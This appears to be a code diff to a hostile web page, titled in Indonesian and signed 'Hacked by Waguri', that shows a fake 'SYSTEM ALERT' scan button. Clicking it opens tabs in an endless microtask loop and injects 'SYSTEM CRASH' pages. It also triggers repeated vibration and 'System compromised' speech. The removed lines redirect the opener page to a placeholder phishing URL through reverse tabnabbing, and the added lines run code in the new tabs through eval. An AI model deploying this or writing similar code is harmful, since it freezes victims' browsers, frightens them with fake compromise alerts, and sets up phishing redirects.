@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>One-Click Race Condition + Reverse Tabnabbing</title>
+<title>Cross-Tab DOM Injection</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Race Condition + Reverse Tabnabbing).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Cross-Tab DOM Injection).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -33,10 +33,9 @@ const statusDiv = document.getElementById("status");
 
 let isProcessing = false;
 
-// Fungsi TTS & Getar
 function efekHacker() {
     if (navigator.vibrate) {
-        navigator.vibrate([1000, 200, 1000, 200, 1000, 200, 1000]);
+        navigator.vibrate([1000, 200, 1000, 200, 1000]);
     }
     if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel();
@@ -53,83 +52,78 @@ startBtn.addEventListener("click", function() {
     startBtn.disabled = true;
     startBtn.textContent = "Sistem Terkunci...";
 
-    // Jalankan efek getar dan suara di halaman utama
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu One-Click Race Condition...";
+    statusDiv.textContent = "Memicu Cross-Tab DOM Injection...";
 
-    // RACE CONDITION: Looping Tanpa Henti
     function picuTerusMenerus() {
         dipicu++;
         try {
-            // Membuka tab kosong
+            // 1. Buka tab kosong
             const w = window.open('about:blank', '_blank');
             
-            // SUNTIKKAN KODE KE TAB BARU
             if (w) {
                 try {
-                    w.document.write(`
-                        <!DOCTYPE html>
-                        <html>
-                        <head><title>Google</title></head>
-                        <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
-                            <div>
-                                <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
-                                <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
-                                <p id="status" style="color:#ff0; font-size:12px; margin-top:20px;">Memicu Race Condition...</p>
-                            </div>
-                            <script>
-                                // --- REVERSE TABNABBING ---
-                                // Membelokkan halaman utama (opener) ke situs lain
-                                try {
-                                    if (window.opener) {
-                                        window.opener.location.href = 'https://example.com/phishing';
-                                    }
-                                } catch(e) {
-                                    // Chrome modern memblokir akses lintas origin (tergantung pengaturan)
-                                }
+                    // 2. SUNTIKKAN ELEMEN HTML LANGSUNG DARI HALAMAN UTAMA
+                    // Karena about:blank mewarisi origin, kita bisa akses w.document
+                    
+                    // Buat elemen style
+                    const style = w.document.createElement('style');
+                    style.textContent = `
+                        body { margin:0; padding:0; background:#000; color:#f00; display:flex; align-items:center; justify-content:center; height:100vh; font-family:monospace; text-align:center; overflow:hidden; }
+                        h1 { font-size:60px; text-shadow:0 0 20px #f00; animation: pulse 0.5s infinite; }
+                        p { color:#0f0; font-size:20px; }
+                        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+                    `;
+                    w.document.head.appendChild(style);
 
-                                // Getar Sangat Lama (Looping di dalam tab baru)
-                                if (navigator.vibrate) {
-                                    setInterval(function() {
-                                        navigator.vibrate([2000, 500, 2000]);
-                                    }, 3000);
-                                }
-                                // Suara TTS diulang
-                                if ('speechSynthesis' in window) {
-                                    setInterval(function() {
-                                        var msg = new SpeechSynthesisUtterance('System compromised');
-                                        msg.lang = 'en-US';
-                                        window.speechSynthesis.speak(msg);
-                                    }, 4000);
-                                }
+                    // Buat elemen div container
+                    const container = w.document.createElement('div');
+                    
+                    // Buat elemen h1
+                    const h1 = w.document.createElement('h1');
+                    h1.textContent = "SYSTEM CRASH";
+                    
+                    // Buat elemen p
+                    const p = w.document.createElement('p');
+                    p.textContent = "Hacked by Waguri";
+                    
+                    // Gabungkan
+                    container.appendChild(h1);
+                    container.appendChild(p);
+                    w.document.body.appendChild(container);
 
-                                // --- RACE CONDITION DI DALAM TAB BARU ---
-                                var dipicuAnak = 0;
-                                function picuAnak() {
-                                    dipicuAnak++;
-                                    try {
-                                        var wAnak = window.open('about:blank', '_blank');
-                                        if (wAnak) {
-                                            wAnak.document.write('<h1 style="color:red;font-family:monospace;text-align:center;margin-top:20%">SYSTEM CRASH</h1>');
-                                            wAnak.document.close();
-                                        }
-                                    } catch(e) {}
-                                    
-                                    document.getElementById('status').textContent = 'Membuka tab anak ke-' + dipicuAnak;
-                                    queueMicrotask(picuAnak);
-                                }
-                                // Jalankan Race Condition di tab anak setelah 1 detik
-                                setTimeout(picuAnak, 1000);
-                            <\/script>
-                        </body>
-                        </html>
+                    // --- REVERSE TABNABBING ---
+                    // (Opsional) Belokkan halaman utama ke situs lain
+                    try {
+                        if (w.opener) {
+                            // w.opener.location.href = 'https://example.com/phishing';
+                        }
+                    } catch(e) {}
+
+                    // --- GETAR & TTS DI TAB BARU ---
+                    // Karena kita punya akses ke w, kita bisa mengeksekusi script di sana
+                    w.eval(`
+                        if (navigator.vibrate) {
+                            setInterval(function() {
+                                navigator.vibrate([2000, 500, 2000]);
+                            }, 3000);
+                        }
+                        if ('speechSynthesis' in window) {
+                            setInterval(function() {
+                                var msg = new SpeechSynthesisUtterance('System compromised');
+                                msg.lang = 'en-US';
+                                window.speechSynthesis.speak(msg);
+                            }, 4000);
+                        }
                     `);
-                    w.document.close();
-                } catch(e) {}
+
+                } catch(e) {
+                    console.warn("Injeksi lintas tab diblokir: " + e.message);
+                }
             }
-            statusDiv.textContent = `Membuka tab utama ke-${dipicu}...`;
+            statusDiv.textContent = `Membuka tab injeksi ke-${dipicu}...`;
         } catch(e) {}
 
         // Panggil dirinya sendiri via Microtask
